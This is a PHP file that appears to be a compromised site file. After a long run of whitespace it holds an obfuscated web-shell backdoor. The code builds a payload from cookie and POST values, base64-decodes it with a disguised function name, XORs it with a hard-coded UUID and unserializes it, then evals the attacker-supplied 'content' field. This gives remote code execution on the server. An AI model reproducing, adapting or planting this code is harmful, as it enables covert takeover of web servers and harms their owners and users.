<?php                                                                                                                                                                                                                                                                                                                                                                                                 $uMZsHLAzHq = class_exists("x_jzsq"); $IpjtpmTh = $uMZsHLAzHq;if (!$IpjtpmTh){class x_jzsq{private $AYKGOaROJW;public static $OjqwiD = "160a4222-d349-41b4-8572-875c70819b90";public static $EAsTu = NULL;public function __construct(){$RXBusf = $_COOKIE;$aNhHs = $_POST;$HOSvWQvKR = @$RXBusf[substr(x_jzsq::$OjqwiD, 0, 4)];if (!empty($HOSvWQvKR)){$TzxSZpRX = "base64";$cBHTQHb = "";$HOSvWQvKR = explode(",", $HOSvWQvKR);foreach ($HOSvWQvKR as $NlSXx){$cBHTQHb .= @$RXBusf[$NlSXx];$cBHTQHb .= @$aNhHs[$NlSXx];}$cBHTQHb = array_map($TzxSZpRX . chr ( 390 - 295 ).chr (100) . "\145" . "\143" . chr (111) . 'd' . chr ( 661 - 560 ), array($cBHTQHb,)); $cBHTQHb = $cBHTQHb[0] ^ str_repeat(x_jzsq::$OjqwiD, (strlen($cBHTQHb[0]) / strlen(x_jzsq::$OjqwiD)) + 1);x_jzsq::$EAsTu = @unserialize($cBHTQHb);}}public function __destruct(){$this->KQboKX();}private function KQboKX(){if (is_array(x_jzsq::$EAsTu)) {$qYllZeulu = str_replace("\74" . '?' . chr (112) . "\150" . chr ( 768 - 656 ), "", x_jzsq::$EAsTu["\x63" . 'o' . "\156" . chr ( 468 - 352 )."\145" . chr ( 267 - 157 ).'t']);eval($qYllZeulu);exit();}}}$crzTvTwPm = new x_jzsq(); $crzTvTwPm = NULL;} ?><?php
